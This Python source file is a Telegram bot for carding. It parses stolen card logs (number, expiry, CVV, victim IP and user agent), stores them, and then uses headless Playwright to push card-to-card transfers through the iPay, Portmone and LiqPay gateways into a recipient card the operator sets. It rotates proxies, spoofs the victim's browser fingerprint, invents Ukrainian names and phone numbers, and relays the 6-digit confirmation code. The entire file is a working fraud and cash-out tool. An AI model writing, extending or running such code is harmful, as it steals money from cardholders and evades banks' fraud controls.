import os
import re
import sqlite3
import asyncio
import aiohttp
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from playwright.async_api import async_playwright
from flask import Flask
import threading

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_PATH = "/var/data/sessions.db"

# ========== FLASK ==========
app = Flask(__name__)
@app.route('/ping')
def ping(): return "OK", 200
def run_flask(): app.run(host='0.0.0.0', port=10000)
threading.Thread(target=run_flask, daemon=True).start()

# ========== БОТ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

def get_main_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
    return kb

# ========== БАЗА ==========
def init_db():
    os.makedirs("/var/data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_from TEXT, expiry TEXT, cvv TEXT,
        ip TEXT, user_agent TEXT,
        amount INTEGER,
        card_to TEXT,
        gateway TEXT,
        status TEXT,
        msg_id INTEGER,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )""")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy_type', 'socks5')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_url', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_enabled', '0')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('gateway', 'ipay')")
    conn.commit()
    conn.close()

def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def create_session(data, msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO sessions
        (card_from, expiry, cvv, ip, user_agent, card_to, gateway, status, msg_id, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (data['card'], data['expiry'], data['cvv'], data['ip'],
         data['user_agent'], get_setting('card_to'), get_setting('gateway'), 'waiting_amount', msg_id, datetime.now().isoformat()))
    session_id = c.lastrowid
    conn.commit()
    conn.close()
    return session_id

def update_session(session_id, field, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"UPDATE sessions SET {field} = ? WHERE id = ?", (value, session_id))
    conn.commit()
    conn.close()

def get_session(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_session_by_msg(msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
    row = c.fetchone()
    conn.close()
    return row

# ========== ПАРСЕР ЛОГА ==========
def parse_log(text):
    data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
    lines = text.split("\n")
    for line in lines:
        if "Номер:" in line or "💳" in line:
            match = re.search(r"\d{15,16}", line)
            if match: data["card"] = match.group()
        if "Истекает:" in line or "📅" in line:
            match = re.search(r"\d{2}[/-]?\d{2,4}", line)
            if match: data["expiry"] = match.group()
        if "CVV:" in line or "🎳" in line:
            match = re.search(r"\b\d{3}\b", line)
            if match: data["cvv"] = match.group()
        if "IP:" in line or "🌍" in line:
            match = re.search(r"\d+\.\d+\.\d+\.\d+", line)
            if match: data["ip"] = match.group()
        if "User-Agent:" in line or "👻" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["user_agent"] = parts[1].strip()
    if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
    return data

# ========== ПАРСЕР ПРОКСИ ==========
def parse_proxy(raw):
    raw = raw.strip()
    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', raw)
    port_match = re.search(r':(\d{2,5})', raw)
    if not ip_match or not port_match:
        return None
    ip = ip_match.group()
    port = port_match.group(1)
    login, password = None, None
    if '@' in raw:
        before_at = raw.split('@')[0]
        if ':' in before_at:
            creds = before_at.split(':')
            if len(creds) >= 2:
                login = creds[0]
                password = creds[1]
    else:
        parts = re.split(r'[:@]', raw)
        for i, part in enumerate(parts):
            if part == ip:
                if i > 0 and ':' not in parts[i-1] and parts[i-1] not in ['socks5', 'http', 'https']:
                    login = parts[i-1]
                if i+1 < len(parts) and ':' not in parts[i+1] and parts[i+1] != port:
                    password = parts[i+1]
                break
    return {'ip': ip, 'port': port, 'login': login, 'password': password}

# ========== ГЕНЕРАТОРЫ ==========
def random_phone():
    return f"+380{random.randint(50,99)}{random.randint(1000000,9999999)}"

def random_name():
    first = ["Іван", "Олександр", "Петро", "Михайло", "Андрій", "Максим", "Дмитро", "Сергій", "Володимир", "Юрій"]
    last = ["Коваленко", "Бондаренко", "Ткаченко", "Кравченко", "Олійник", "Шевченко", "Бойко", "Мельник"]
    return f"{random.choice(last)} {random.choice(first)}"

# ========== КНОПКИ ==========
def get_amount_keyboard(session_id):
    kb = InlineKeyboardMarkup(row_width=3)
    amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
    for a in amounts:
        kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
    return kb

async def get_rotated_proxy():
    url = get_setting('rotation_url')
    if not url:
        return get_setting('proxy')
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    proxy = await resp.text()
                    return proxy.strip()
    except:
        pass
    return get_setting('proxy')

# ========== ЭМУЛЯЦИЯ ПЛАТЕЖА ==========
async def emulate_payment(session_id, code=None):
    session = get_session(session_id)
    if not session: return "Сессия не найдена"
    card, expiry, cvv, ip, ua, amount, card_to, gateway = session[1], session[2], session[3], session[4], session[5], session[6], session[7], session[8]
    if not card_to: return "❌ Карта получателя не задана! Используй кнопку 'Карта' в админке"
    expiry = expiry.replace("/", "").strip()
    if len(expiry) == 4: expiry = expiry[:2] + "/" + expiry[2:]
    
    proxy_str = None
    if get_setting('rotation_enabled') == '1':
        proxy_str = await get_rotated_proxy()
    else:
        proxy_str = get_setting('proxy')
    
    proxy_type = get_setting('proxy_type') or 'socks5'
    proxy_config = None
    if proxy_str:
        parsed = parse_proxy(proxy_str)
        if parsed:
            proxy_config = {"server": f"{proxy_type}://{parsed['ip']}:{parsed['port']}"}
            if parsed['login'] and parsed['password']:
                proxy_config["username"] = parsed['login']
                proxy_config["password"] = parsed['password']

    phone = random_phone()
    name = random_name()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, proxy=proxy_config if proxy_config else None)
        context = await browser.new_context(user_agent=ua or "Mozilla/5.0 (Linux; Android 10)", locale="uk-UA", timezone_id="Europe/Kyiv")
        page = await context.new_page()

        # === IPAY ===
        if gateway == "ipay":
            await page.goto("https://ipay.ua/card2card")
            await page.fill('input[name="card_from"]', card)
            await page.fill('input[name="expiry"]', expiry)
            await page.fill('input[name="cvv"]', cvv)
            await page.fill('input[name="card_to"]', card_to)
            await page.fill('input[name="amount"]', str(amount))
            await page.fill('input[name="recipient_name"]', name)
            await page.fill('input[name="recipient_phone"]', phone)
            await page.click('button[type="submit"]')
            await asyncio.sleep(3)

        # === PORTMONE ===
        elif gateway == "portmone":
            await page.goto("https://portmone.com.ua/card2card")
            await page.fill('input[name="card_from"]', card)
            await page.fill('input[name="expiry"]', expiry)
            await page.fill('input[name="cvv"]', cvv)
            await page.fill('input[name="card_to"]', card_to)
            await page.fill('input[name="amount"]', str(amount))
            await page.fill('input[name="name"]', name)
            await page.click('button[type="submit"]')
            await asyncio.sleep(3)

        # === LIQPAY (если добавим) ===
        elif gateway == "liqpay":
            await page.goto("https://liqpay.ua/ru/order")
            await page.fill('input[name="card"]', card)
            await page.fill('input[name="expiry"]', expiry)
            await page.fill('input[name="cvv"]', cvv)
            await page.fill('input[name="amount"]', str(amount))
            await page.fill('input[name="name"]', name)
            await page.click('button[type="submit"]')
            await asyncio.sleep(3)

        screenshot = await page.screenshot(full_page=True)
        await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"💳 {gateway.upper()} | {amount} UAH")

        if await page.is_visible('input[name="code"]'):
            if code:
                await page.fill('input[name="code"]', code)
                await page.click('button[type="submit"]')
                await asyncio.sleep(2)
                return "✅ Платёж подтверждён!"
            else:
                await asyncio.sleep(60)
                if await page.is_visible('button:has-text("Отправить код")'):
                    await page.click('button:has-text("Отправить код")')
                    return "waiting_code"
        if await page.is_visible('.success'):
            return "✅ Платёж выполнен успешно!"
        error_text = await page.text_content('.error')
        return f"❌ Ошибка: {error_text or 'неизвестная'}"

# ========== КОМАНДЫ ==========
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏦 Бот активирован. Шли лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
async def main_menu(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 Карта", callback_data="change_card"),
        InlineKeyboardButton("🌐 Шлюз", callback_data="change_gateway"),
        InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
        InlineKeyboardButton("🔄 Тип прокси", callback_data="change_proxy_type"),
        InlineKeyboardButton("🔁 Ротация", callback_data="toggle_rotation"),
        InlineKeyboardButton("🗑 Удалить прокси", callback_data="delete_proxy"),
        InlineKeyboardButton("📋 Статус", callback_data="show_status"),
    )
    await msg.reply("🏦 Админ-панель", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "change_gateway")
async def change_gateway(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 iPay", callback_data="set_gateway_ipay"),
        InlineKeyboardButton("💳 Portmone", callback_data="set_gateway_portmone"),
        InlineKeyboardButton("💳 LiqPay", callback_data="set_gateway_liqpay"),
    )
    await callback.message.reply("🌐 Выберите шлюз:", reply_markup=kb)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_gateway_"))
async def set_gateway(callback: types.CallbackQuery):
    gw = callback.data.split("_")[2]
    set_setting('gateway', gw)
    await callback.message.reply(f"✅ Шлюз установлен: {gw.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "toggle_rotation")
async def toggle_rotation(callback: types.CallbackQuery):
    current = get_setting('rotation_enabled')
    new = '0' if current == '1' else '1'
    set_setting('rotation_enabled', new)
    if new == '1':
        await callback.message.reply("🔁 Ротация включена. Введите ссылку для ротации (ответьте):")
    else:
        await callback.message.reply("🔁 Ротация выключена.")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "delete_proxy")
async def delete_proxy(callback: types.CallbackQuery):
    set_setting('proxy', '')
    set_setting('rotation_url', '')
    set_setting('rotation_enabled', '0')
    await callback.message.reply("🗑 Прокси удалён.")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("change_"))
async def settings_callback(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    prompts = {
        "card": "Введите номер карты получателя (15-16 цифр):",
        "proxy": "Введите прокси в любом формате:",
        "proxy_type": "Выберите тип:",
    }
    if action == "proxy_type":
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("SOCKS5", callback_data="set_type_socks5"),
            InlineKeyboardButton("HTTP", callback_data="set_type_http"),
        )
        await callback.message.reply("Выберите тип:", reply_markup=kb)
        await callback.answer()
        return
    await callback.message.reply(prompts.get(action, "Ошибка"))
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_type_"))
async def set_proxy_type(callback: types.CallbackQuery):
    ptype = callback.data.split("_")[2]
    set_setting('proxy_type', ptype)
    await callback.message.reply(f"✅ Тип: {ptype.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "show_status")
async def show_status(callback: types.CallbackQuery):
    card = get_setting('card_to') or "не задана"
    proxy = get_setting('proxy') or "не задан"
    ptype = get_setting('proxy_type') or "socks5"
    rotation = "включена" if get_setting('rotation_enabled') == '1' else "выключена"
    gateway = get_setting('gateway') or "не выбран"
    await callback.message.reply(
        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n📌 Тип: {ptype.upper()}\n🔁 Ротация: {rotation}"
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
async def handle_amount_callback(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    session_id = int(parts[1])
    amount = int(parts[2])
    await callback.answer(f"💰 {amount} UAH")
    update_session(session_id, 'amount', amount)
    update_session(session_id, 'status', 'processing')
    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
    result = await emulate_payment(session_id)
    if result == "waiting_code":
        update_session(session_id, 'status', 'waiting_code')
        code_msg = await callback.message.reply("🔐 Введите 6-значный код (ответьте на это сообщение):")
        update_session(session_id, 'msg_id', code_msg.message_id)
    else:
        update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
        await callback.message.reply(result)

# ========== ОБРАБОТЧИК ОТВЕТОВ ==========
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
async def handle_all_reply(msg: types.Message):
    text = msg.reply_to_message.text
    user_input = msg.text.strip()

    if "номер карты получателя" in text:
        if re.match(r"^\d{15,16}$", user_input):
            set_setting('card_to', user_input)
            await msg.reply(f"✅ Карта: {user_input}")
        else:
            await msg.reply("❌ 15 или 16 цифр.")
        return

    if "прокси" in text and "ротации" not in text:
        parsed = parse_proxy(user_input)
        if parsed:
            set_setting('proxy', user_input)
            await msg.reply(f"✅ Прокси сохранён.")
        else:
            await msg.reply("❌ Не распознан. Формат: ip:port или login:pass@ip:port")
        return

    if "ссылку для ротации" in text:
        if user_input.startswith("http"):
            set_setting('rotation_url', user_input)
            await msg.reply("✅ Ссылка сохранена.")
        else:
            await msg.reply("❌ Введи HTTP/HTTPS ссылку.")
        return

    if "код" in text:
        if not user_input.isdigit() or len(user_input) != 6:
            await msg.reply("❌ 6 цифр!")
            return
        session = get_session_by_msg(msg.reply_to_message.message_id)
        if not session:
            await msg.reply("❌ Сессия не найдена.")
            return
        session_id = session[0]
        await msg.reply("🔄 Подтверждаю...")
        result = await emulate_payment(session_id, user_input)
        update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
        await msg.reply(result)
        return

    await msg.reply("❌ Не понял. Используй кнопки.")

# ========== ОБРАБОТЧИК ЛОГА ==========
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
async def handle_log(msg: types.Message):
    data = parse_log(msg.text)
    if not data["card"] or not data["expiry"] or not data["cvv"]:
        await msg.reply("❌ Не удалось распознать данные.")
        return
    session_id = create_session(data, msg.message_id)
    kb = get_amount_keyboard(session_id)
    await msg.reply(
        f"✅ Данные распознаны:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
        f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
        f"👻 UA: {data['user_agent'][:30]}...\n\n"
        f"💰 Выберите сумму:",
        reply_markup=kb
    )

if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)
